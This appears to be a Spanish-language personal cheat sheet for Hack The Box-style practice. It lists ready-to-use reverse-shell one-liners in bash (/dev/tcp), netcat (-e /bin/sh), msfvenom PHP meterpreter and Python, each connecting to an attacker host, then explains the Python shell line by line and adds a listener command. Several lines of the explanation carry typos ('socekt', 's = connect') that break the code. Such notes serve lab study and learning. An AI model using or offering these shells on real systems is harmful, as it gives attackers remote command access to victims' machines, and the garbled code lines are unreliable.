`git clone https://github.com/s4vitar/htbExplorer.git`
`chmod +x htbExplorer`

## Previa 
comando: **ping -c 1 ip**: Ver si hay conexion | flag `-R` ver lo que hace --> ttl= 64 (Linux) / 128 (win)


## Reverse Shell

**bash**: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
**netcat**: nc -e /bin/sh 10.0.0.1 1234
**php (metasplit)**: msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
**py** : python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

-----------------------------
# PYTHON
*python -c *: corre string como comando
import socket, subprocces, os: 
- **`socket`**: Es la librería para comunicaciones de red (crear la conexión).
    
- **`subprocess`**: Sirve para ejecutar comandos en el sistema operativo (en este caso, lanzar la terminal).
    
- **`os`**: Permite interactuar con el sistema a bajo nivel (necesario para manipular los descriptores de archivo).

s = socket.socket(socekt.AF_INET, socket.SOCK_STREAM);
s = connect(("ip", puerto))
- **`AF_INET`** le dice que use IPv4.
    
- **`SOCK_STREAM`** le dice que use el protocolo TCP (que es fiable y mantiene la conexión abierta).
    
- **`connect`** es donde marcas el número: le dices a la víctima que se conecte a **TU IP** y a **TU PUERTO**.

os.dup2(s.fileno(), 0); # stdin (entrada)
os.dup2(s.fileno(), 1); # stdout (salida)
os.dup2(s.fileno(), 2); # stderr (errores)

- Lo que hace `os.dup2` es **clonar** tu conexión de red (`s.fileno()`) sobre esos tres archivos.

p = subprocess.call(["/bin/sh", "-i"]);

**correr**: tener en otra terminal nc -lvnp puerto